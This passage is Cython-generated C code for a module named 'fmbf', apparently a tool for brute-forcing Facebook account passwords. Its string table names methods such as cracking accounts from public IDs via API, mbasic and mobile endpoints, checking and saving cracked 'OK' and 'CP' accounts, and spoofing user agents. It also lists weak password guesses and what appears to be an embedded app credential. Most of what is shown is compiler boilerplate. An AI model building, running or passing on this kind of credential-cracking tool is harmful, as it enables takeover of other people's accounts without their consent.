        __Pyx_GIVEREF(__pyx_v_pwx);
        PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_19, __pyx_v_pwx);
        __Pyx_INCREF(__pyx_v_url);
        __Pyx_GIVEREF(__pyx_v_url);
        PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_19, __pyx_v_url);
        __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_17, NULL); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 333, __pyx_L5_except_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
      }
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_10, __pyx_t_11);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_10, __pyx_t_11);
    __pyx_L8_try_end:;
  }

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loop); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 334, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyInt_AddObjC(__pyx_t_2, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 334, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_loop, __pyx_t_1) < 0) __PYX_ERR(0, 334, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_XDECREF(__pyx_t_18);
  __Pyx_AddTraceback("fmbf.Crack.metode_validate", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_pw);
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_ses);
  __Pyx_XDECREF(__pyx_v_get);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_post);
  __Pyx_XDECREF(__pyx_v_cookie);
  __Pyx_XDECREF(__pyx_8genexpr1__pyx_v_x);
  __Pyx_XDECREF(__pyx_8genexpr1__pyx_v_y);
  __Pyx_XDECREF(__pyx_8genexpr2__pyx_v_key);
  __Pyx_XDECREF(__pyx_8genexpr2__pyx_v_value);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_4fmbf_5Crack_11simpan_hasil(PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyMethodDef __pyx_mdef_4fmbf_5Crack_11simpan_hasil = {"simpan_hasil", (PyCFunction)__pyx_pw_4fmbf_5Crack_11simpan_hasil, METH_O, 0};
static PyObject *__pyx_pw_4fmbf_5Crack_11simpan_hasil(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("simpan_hasil (wrapper)", 0);
  __pyx_r = __pyx_pf_4fmbf_5Crack_10simpan_hasil(__pyx_self, ((PyObject *)__pyx_v_self));

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_4fmbf_5Crack_10simpan_hasil(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("simpan_hasil", 0);

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_hari_ini); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 337, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 337, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyUnicode_Concat(__pyx_kp_u_hasil_OK_disimpan_ke_OK, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 337, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 337, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_hari_ini); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 338, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 338, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyUnicode_Concat(__pyx_kp_u_hasil_CP_disimpan_ke_CP, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 338, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 338, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__76, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 339, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_AddTraceback("fmbf.Crack.simpan_hasil", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api *__pyx_freelist_4fmbf___pyx_scope_struct__metode_api[8];
static int __pyx_freecount_4fmbf___pyx_scope_struct__metode_api = 0;

static PyObject *__pyx_tp_new_4fmbf___pyx_scope_struct__metode_api(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  if (CYTHON_COMPILING_IN_CPYTHON && likely((__pyx_freecount_4fmbf___pyx_scope_struct__metode_api > 0) & (t->tp_basicsize == sizeof(struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api)))) {
    o = (PyObject*)__pyx_freelist_4fmbf___pyx_scope_struct__metode_api[--__pyx_freecount_4fmbf___pyx_scope_struct__metode_api];
    memset(o, 0, sizeof(struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  return o;
}

static void __pyx_tp_dealloc_4fmbf___pyx_scope_struct__metode_api(PyObject *o) {
  struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api *p = (struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api *)o;
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_v_post);
  if (CYTHON_COMPILING_IN_CPYTHON && ((__pyx_freecount_4fmbf___pyx_scope_struct__metode_api < 8) & (Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api)))) {
    __pyx_freelist_4fmbf___pyx_scope_struct__metode_api[__pyx_freecount_4fmbf___pyx_scope_struct__metode_api++] = ((struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}

static int __pyx_tp_traverse_4fmbf___pyx_scope_struct__metode_api(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api *p = (struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api *)o;
  if (p->__pyx_v_post) {
    e = (*v)(p->__pyx_v_post, a); if (e) return e;
  }
  return 0;
}

static int __pyx_tp_clear_4fmbf___pyx_scope_struct__metode_api(PyObject *o) {
  PyObject* tmp;
  struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api *p = (struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api *)o;
  tmp = ((PyObject*)p->__pyx_v_post);
  p->__pyx_v_post = Py_None; Py_INCREF(Py_None);
  Py_XDECREF(tmp);
  return 0;
}

static PyTypeObject __pyx_type_4fmbf___pyx_scope_struct__metode_api = {
  PyVarObject_HEAD_INIT(0, 0)
  "fmbf.__pyx_scope_struct__metode_api", 
  sizeof(struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api), 
  0, 
  __pyx_tp_dealloc_4fmbf___pyx_scope_struct__metode_api, 
  #if PY_VERSION_HEX < 0x030800b4
  0, 
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, 
  #endif
  0, 
  0, 
  #if PY_MAJOR_VERSION < 3
  0, 
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, 
  #endif
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC, 
  0, 
  __pyx_tp_traverse_4fmbf___pyx_scope_struct__metode_api, 
  __pyx_tp_clear_4fmbf___pyx_scope_struct__metode_api, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  __pyx_tp_new_4fmbf___pyx_scope_struct__metode_api, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  #if PY_VERSION_HEX >= 0x030400a1
  0, 
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, 
  #endif
  #if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
  0, 
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
  0, 
  #endif
};

static struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr *__pyx_freelist_4fmbf___pyx_scope_struct_1_genexpr[8];
static int __pyx_freecount_4fmbf___pyx_scope_struct_1_genexpr = 0;

static PyObject *__pyx_tp_new_4fmbf___pyx_scope_struct_1_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  if (CYTHON_COMPILING_IN_CPYTHON && likely((__pyx_freecount_4fmbf___pyx_scope_struct_1_genexpr > 0) & (t->tp_basicsize == sizeof(struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr)))) {
    o = (PyObject*)__pyx_freelist_4fmbf___pyx_scope_struct_1_genexpr[--__pyx_freecount_4fmbf___pyx_scope_struct_1_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  return o;
}

static void __pyx_tp_dealloc_4fmbf___pyx_scope_struct_1_genexpr(PyObject *o) {
  struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr *p = (struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr *)o;
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_outer_scope);
  Py_CLEAR(p->__pyx_v_i);
  Py_CLEAR(p->__pyx_t_0);
  if (CYTHON_COMPILING_IN_CPYTHON && ((__pyx_freecount_4fmbf___pyx_scope_struct_1_genexpr < 8) & (Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr)))) {
    __pyx_freelist_4fmbf___pyx_scope_struct_1_genexpr[__pyx_freecount_4fmbf___pyx_scope_struct_1_genexpr++] = ((struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}

static int __pyx_tp_traverse_4fmbf___pyx_scope_struct_1_genexpr(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr *p = (struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr *)o;
  if (p->__pyx_outer_scope) {
    e = (*v)(((PyObject *)p->__pyx_outer_scope), a); if (e) return e;
  }
  if (p->__pyx_v_i) {
    e = (*v)(p->__pyx_v_i, a); if (e) return e;
  }
  if (p->__pyx_t_0) {
    e = (*v)(p->__pyx_t_0, a); if (e) return e;
  }
  return 0;
}

static PyTypeObject __pyx_type_4fmbf___pyx_scope_struct_1_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "fmbf.__pyx_scope_struct_1_genexpr", 
  sizeof(struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr), 
  0, 
  __pyx_tp_dealloc_4fmbf___pyx_scope_struct_1_genexpr, 
  #if PY_VERSION_HEX < 0x030800b4
  0, 
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, 
  #endif
  0, 
  0, 
  #if PY_MAJOR_VERSION < 3
  0, 
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, 
  #endif
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC, 
  0, 
  __pyx_tp_traverse_4fmbf___pyx_scope_struct_1_genexpr, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  __pyx_tp_new_4fmbf___pyx_scope_struct_1_genexpr, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  0, 
  #if PY_VERSION_HEX >= 0x030400a1
  0, 
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, 
  #endif
  #if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
  0, 
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
  0, 
  #endif
};

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); 
static int __pyx_pymod_exec_fmbf(PyObject* module); 
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_fmbf},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "fmbf",
    0, 
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, 
  #else
    -1, 
  #endif
    __pyx_methods ,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, 
  #else
    NULL, 
  #endif
    NULL, 
    NULL, 
    NULL 
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_kp_u_, __pyx_k_, sizeof(__pyx_k_), 0, 1, 0, 0},
  {&__pyx_kp_s_0, __pyx_k_0, sizeof(__pyx_k_0), 0, 0, 1, 0},
  {&__pyx_kp_s_00, __pyx_k_00, sizeof(__pyx_k_00), 0, 0, 1, 0},
  {&__pyx_kp_u_00, __pyx_k_00, sizeof(__pyx_k_00), 0, 1, 0, 0},
  {&__pyx_kp_s_01, __pyx_k_01, sizeof(__pyx_k_01), 0, 0, 1, 0},
  {&__pyx_kp_s_01_cek_akun_hasil_crack_OK, __pyx_k_01_cek_akun_hasil_crack_OK, sizeof(__pyx_k_01_cek_akun_hasil_crack_OK), 0, 0, 1, 0},
  {&__pyx_kp_s_01_crack_dari_id_publik, __pyx_k_01_crack_dari_id_publik, sizeof(__pyx_k_01_crack_dari_id_publik), 0, 0, 1, 0},
  {&__pyx_kp_s_02, __pyx_k_02, sizeof(__pyx_k_02), 0, 0, 1, 0},
  {&__pyx_kp_s_02_cek_akun_hasil_crack_CP, __pyx_k_02_cek_akun_hasil_crack_CP, sizeof(__pyx_k_02_cek_akun_hasil_crack_CP), 0, 0, 1, 0},
  {&__pyx_kp_s_02_setting_useragent, __pyx_k_02_setting_useragent, sizeof(__pyx_k_02_setting_useragent), 0, 0, 1, 0},
  {&__pyx_kp_s_03, __pyx_k_03, sizeof(__pyx_k_03), 0, 0, 1, 0},
  {&__pyx_kp_s_03_lihat_akun_hasil_crack, __pyx_k_03_lihat_akun_hasil_crack, sizeof(__pyx_k_03_lihat_akun_hasil_crack), 0, 0, 1, 0},
  {&__pyx_kp_s_0_0, __pyx_k_0_0, sizeof(__pyx_k_0_0), 0, 0, 1, 0},
  {&__pyx_kp_u_0_0_0_Mobile_Safari_537_36, __pyx_k_0_0_0_Mobile_Safari_537_36, sizeof(__pyx_k_0_0_0_Mobile_Safari_537_36), 0, 1, 0, 0},
  {&__pyx_kp_s_0_0_2, __pyx_k_0_0_2, sizeof(__pyx_k_0_0_2), 0, 0, 1, 0},
  {&__pyx_kp_s_0_2, __pyx_k_0_2, sizeof(__pyx_k_0_2), 0, 0, 1, 0},
  {&__pyx_kp_s_0m, __pyx_k_0m, sizeof(__pyx_k_0m), 0, 0, 1, 0},
  {&__pyx_kp_s_1, __pyx_k_1, sizeof(__pyx_k_1), 0, 0, 1, 0},
  {&__pyx_kp_s_10_0_2, __pyx_k_10_0_2, sizeof(__pyx_k_10_0_2), 0, 0, 1, 0},
  {&__pyx_kp_s_10_1_1, __pyx_k_10_1_1, sizeof(__pyx_k_10_1_1), 0, 0, 1, 0},
  {&__pyx_kp_s_10_2, __pyx_k_10_2, sizeof(__pyx_k_10_2), 0, 0, 1, 0},
  {&__pyx_kp_s_10_2_1, __pyx_k_10_2_1, sizeof(__pyx_k_10_2_1), 0, 0, 1, 0},
  {&__pyx_kp_s_10_3_1, __pyx_k_10_3_1, sizeof(__pyx_k_10_3_1), 0, 0, 1, 0},
  {&__pyx_kp_s_10_3_2, __pyx_k_10_3_2, sizeof(__pyx_k_10_3_2), 0, 0, 1, 0},
  {&__pyx_kp_s_10_3_3, __pyx_k_10_3_3, sizeof(__pyx_k_10_3_3), 0, 0, 1, 0},
  {&__pyx_kp_s_123, __pyx_k_123, sizeof(__pyx_k_123), 0, 0, 1, 0},
  {&__pyx_kp_s_1234, __pyx_k_1234, sizeof(__pyx_k_1234), 0, 0, 1, 0},
  {&__pyx_kp_s_12345, __pyx_k_12345, sizeof(__pyx_k_12345), 0, 0, 1, 0},
  {&__pyx_kp_s_13C75, __pyx_k_13C75, sizeof(__pyx_k_13C75), 0, 0, 1, 0},
  {&__pyx_kp_s_13D15, __pyx_k_13D15, sizeof(__pyx_k_13D15), 0, 0, 1, 0},
  {&__pyx_kp_s_13E233, __pyx_k_13E233, sizeof(__pyx_k_13E233), 0, 0, 1, 0},
  {&__pyx_kp_s_13E238, __pyx_k_13E238, sizeof(__pyx_k_13E238), 0, 0, 1, 0},
  {&__pyx_kp_s_13F69, __pyx_k_13F69, sizeof(__pyx_k_13F69), 0, 0, 1, 0},
  {&__pyx_kp_s_13G34, __pyx_k_13G34, sizeof(__pyx_k_13G34), 0, 0, 1, 0},
  {&__pyx_kp_s_13G36, __pyx_k_13G36, sizeof(__pyx_k_13G36), 0, 0, 1, 0},
  {&__pyx_kp_s_14A456, __pyx_k_14A456, sizeof(__pyx_k_14A456), 0, 0, 1, 0},
  {&__pyx_kp_s_14B100, __pyx_k_14B100, sizeof(__pyx_k_14B100), 0, 0, 1, 0},
  {&__pyx_kp_s_14C92, __pyx_k_14C92, sizeof(__pyx_k_14C92), 0, 0, 1, 0},
  {&__pyx_kp_s_14D27, __pyx_k_14D27, sizeof(__pyx_k_14D27), 0, 0, 1, 0},
  {&__pyx_kp_s_14E304, __pyx_k_14E304, sizeof(__pyx_k_14E304), 0, 0, 1, 0},
  {&__pyx_kp_s_14F89, __pyx_k_14F89, sizeof(__pyx_k_14F89), 0, 0, 1, 0},
  {&__pyx_kp_s_14G60, __pyx_k_14G60, sizeof(__pyx_k_14G60), 0, 0, 1, 0},
  {&__pyx_kp_s_1_2, __pyx_k_1_2, sizeof(__pyx_k_1_2), 0, 0, 1, 0},
  {&__pyx_kp_s_1_91m, __pyx_k_1_91m, sizeof(__pyx_k_1_91m), 0, 0, 1, 0},
  {&__pyx_kp_s_1_92m, __pyx_k_1_92m, sizeof(__pyx_k_1_92m), 0, 0, 1, 0},
  {&__pyx_kp_s_1_93m, __pyx_k_1_93m, sizeof(__pyx_k_1_93m), 0, 0, 1, 0},
  {&__pyx_kp_s_1_method_API_fast, __pyx_k_1_method_API_fast, sizeof(__pyx_k_1_method_API_fast), 0, 0, 1, 0},
  {&__pyx_kp_s_2, __pyx_k_2, sizeof(__pyx_k_2), 0, 0, 1, 0},
  {&__pyx_kp_u_200, __pyx_k_200, sizeof(__pyx_k_200), 0, 1, 0, 0},
  {&__pyx_kp_s_200424423651082_2a9918c6bcd75b94, __pyx_k_200424423651082_2a9918c6bcd75b94, sizeof(__pyx_k_200424423651082_2a9918c6bcd75b94), 0, 0, 1, 0},
  {&__pyx_kp_s_2_method_mbasic_slow, __pyx_k_2_method_mbasic_slow, sizeof(__pyx_k_2_method_mbasic_slow), 0, 0, 1, 0},
  {&__pyx_kp_s_3, __pyx_k_3, sizeof(__pyx_k_3), 0, 0, 1, 0},
  {&__pyx_kp_s_3_method_mobile_super_slow, __pyx_k_3_method_mobile_super_slow, sizeof(__pyx_k_3_method_mobile_super_slow), 0, 0, 1, 0},
  {&__pyx_kp_s_4f648f21fb58fcd2aa1c65f35f441ef5, __pyx_k_4f648f21fb58fcd2aa1c65f35f441ef5, sizeof(__pyx_k_4f648f21fb58fcd2aa1c65f35f441ef5), 0, 0, 1, 0},
  {&__pyx_kp_s_601_1_46, __pyx_k_601_1_46, sizeof(__pyx_k_601_1_46), 0, 0, 1, 0},
  {&__pyx_kp_s_602_1_50, __pyx_k_602_1_50, sizeof(__pyx_k_602_1_50), 0, 0, 1, 0},
  {&__pyx_kp_s_602_2_14, __pyx_k_602_2_14, sizeof(__pyx_k_602_2_14), 0, 0, 1, 0},
  {&__pyx_kp_s_602_3_12, __pyx_k_602_3_12, sizeof(__pyx_k_602_3_12), 0, 0, 1, 0},
  {&__pyx_kp_s_602_4_6, __pyx_k_602_4_6, sizeof(__pyx_k_602_4_6), 0, 0, 1, 0},
  {&__pyx_kp_s_603_1_30, __pyx_k_603_1_30, sizeof(__pyx_k_603_1_30), 0, 0, 1, 0},
  {&__pyx_kp_s_603_2_4, __pyx_k_603_2_4, sizeof(__pyx_k_603_2_4), 0, 0, 1, 0},
  {&__pyx_kp_s_603_3_8, __pyx_k_603_3_8, sizeof(__pyx_k_603_3_8), 0, 0, 1, 0},
  {&__pyx_n_s_A, __pyx_k_A, sizeof(__pyx_k_A), 0, 0, 1, 1},
  {&__pyx_kp_s_A_d_B_Y, __pyx_k_A_d_B_Y, sizeof(__pyx_k_A_d_B_Y), 0, 0, 1, 0},
  {&__pyx_kp_s_Android, __pyx_k_Android, sizeof(__pyx_k_Android), 0, 0, 1, 0},
  {&__pyx_kp_s_Android_2, __pyx_k_Android_2, sizeof(__pyx_k_Android_2), 0, 0, 1, 0},
  {&__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G, __pyx_k_AppleWebKit_537_36_KHTML_like_G, sizeof(__pyx_k_AppleWebKit_537_36_KHTML_like_G), 0, 1, 0, 0},
  {&__pyx_kp_u_Author_Fall_Xavier_Dominic_Grem, __pyx_k_Author_Fall_Xavier_Dominic_Grem, sizeof(__pyx_k_Author_Fall_Xavier_Dominic_Grem), 0, 1, 0, 0},
  {&__pyx_n_s_B, __pyx_k_B, sizeof(__pyx_k_B), 0, 0, 1, 1},
  {&__pyx_n_s_BeautifulSoup, __pyx_k_BeautifulSoup, sizeof(__pyx_k_BeautifulSoup), 0, 0, 1, 1},
  {&__pyx_kp_u_Bergabung, __pyx_k_Bergabung, sizeof(__pyx_k_Bergabung), 0, 1, 0, 0},
  {&__pyx_kp_s_Build, __pyx_k_Build, sizeof(__pyx_k_Build), 0, 0, 1, 0},
  {&__pyx_kp_u_Build, __pyx_k_Build, sizeof(__pyx_k_Build), 0, 1, 0, 0},
  {&__pyx_n_s_C, __pyx_k_C, sizeof(__pyx_k_C), 0, 0, 1, 1},
  {&__pyx_n_s_CP, __pyx_k_CP, sizeof(__pyx_k_CP), 0, 0, 1, 1},
  {&__pyx_kp_s_CPU_OS_like, __pyx_k_CPU_OS_like, sizeof(__pyx_k_CPU_OS_like), 0, 0, 1, 0},
  {&__pyx_kp_s_CPU_iPhone_OS_like, __pyx_k_CPU_iPhone_OS_like, sizeof(__pyx_k_CPU_iPhone_OS_like), 0, 0, 1, 0},
  {&__pyx_kp_u_CP_2, __pyx_k_CP_2, sizeof(__pyx_k_CP_2), 0, 1, 0, 0},
  {&__pyx_kp_u_CP_3, __pyx_k_CP_3, sizeof(__pyx_k_CP_3), 0, 1, 0, 0},
  {&__pyx_kp_u_Chrome, __pyx_k_Chrome, sizeof(__pyx_k_Chrome), 0, 1, 0, 0},
  {&__pyx_kp_s_Chrome_Mobile, __pyx_k_Chrome_Mobile, sizeof(__pyx_k_Chrome_Mobile), 0, 0, 1, 0},
  {&__pyx_n_s_ConnectionError, __pyx_k_ConnectionError, sizeof(__pyx_k_ConnectionError), 0, 0, 1, 1},
  {&__pyx_n_s_Crack, __pyx_k_Crack, sizeof(__pyx_k_Crack), 0, 0, 1, 1},
  {&__pyx_n_s_Crack___init, __pyx_k_Crack___init, sizeof(__pyx_k_Crack___init), 0, 0, 1, 1},
  {&__pyx_n_s_Crack_atursandi, __pyx_k_Crack_atursandi, sizeof(__pyx_k_Crack_atursandi), 0, 0, 1, 1},
  {&__pyx_n_s_Crack_metode_api, __pyx_k_Crack_metode_api, sizeof(__pyx_k_Crack_metode_api), 0, 0, 1, 1},
  {&__pyx_n_s_Crack_metode_api_locals_genexpr, __pyx_k_Crack_metode_api_locals_genexpr, sizeof(__pyx_k_Crack_metode_api_locals_genexpr), 0, 0, 1, 1},
  {&__pyx_n_s_Crack_metode_validate, __pyx_k_Crack_metode_validate, sizeof(__pyx_k_Crack_metode_validate), 0, 0, 1, 1},
  {&__pyx_n_s_Crack_sandi, __pyx_k_Crack_sandi, sizeof(__pyx_k_Crack_sandi), 0, 0, 1, 1},
